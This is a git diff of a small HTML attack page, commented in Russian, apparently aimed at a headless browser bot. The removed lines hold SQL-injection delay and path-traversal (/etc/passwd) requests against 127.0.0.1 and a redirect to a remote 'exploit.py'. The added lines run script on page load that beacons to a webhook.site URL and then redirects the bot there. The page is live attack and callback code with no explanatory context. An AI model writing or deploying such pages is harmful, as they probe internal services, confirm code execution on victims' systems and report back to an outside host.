@@ -1,19 +1,38 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>DEBUG MODE</title>
+</head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py">
-
-    <link rel="dns-prefetch" href="http://5d2815a1-7a4c-4d21-9462-22b22be8d349.webhook.site">
-
-    <img src="http://127.0.0.1/search?q=';WAITFOR+DELAY+'0:0:10'--">
-    <img src="http://127.0.0.1/view?file=../../../../etc/passwd">
+    <h1 id="status">Testing Connection...</h1>
 
     <script>
-        // На случай если Chrome-бот (MAX) все-таки зайдет
-        // Мы сделаем редирект на питон-файл, чтобы бот "захлебнулся" им
+        // ВНИМАНИЕ: Проверь этот ID, он должен быть в точности как в твоей панели Webhook.site
+        const hookId = "5d2815a1-7a4c-4d21-9462-22b22be8d349";
+        const hookUrl = `https://webhook.site/${hookId}`; // Обязательно HTTPS
+
+        function log(path) {
+            const img = new Image();
+            img.src = `${hookUrl}/${path}?rand=${Math.random()}`;
+            console.log("Sent:", path);
+        }
+
+        // 1. Немедленный отстук при загрузке
+        log("DEBUG_JS_ALIVE");
+
+        // 2. Попытка RCE (имитация)
+        log("TRYING_PYTHON_RCE");
+        
+        // Если ты видишь этот текст на экране, значит страница загрузилась
+        document.getElementById('status').innerText = "JS Executed. Check Webhook!";
+
+        // 3. Редирект (самый надежный способ, если картинки блочат)
         setTimeout(() => {
-            window.location.href = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py";
-        }, 500);
+            window.location.href = `${hookUrl}/FINAL_REDIRECT_HIT`;
+        }, 3000);
     </script>
+
+    <img src="https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/IMG_TAG_HIT">
 </body>
 </html>
